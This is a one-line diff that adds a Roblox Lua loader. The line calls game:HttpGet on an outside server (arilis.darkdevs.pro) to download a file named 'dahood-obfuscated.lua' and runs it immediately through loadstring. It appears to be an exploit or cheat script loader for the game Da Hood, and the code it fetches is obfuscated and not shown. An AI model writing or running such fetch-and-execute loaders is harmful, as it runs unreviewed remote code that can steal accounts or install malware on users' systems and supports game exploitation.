@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('http://arilis.darkdevs.pro/scripts/dahood-obfuscated.lua', true))()
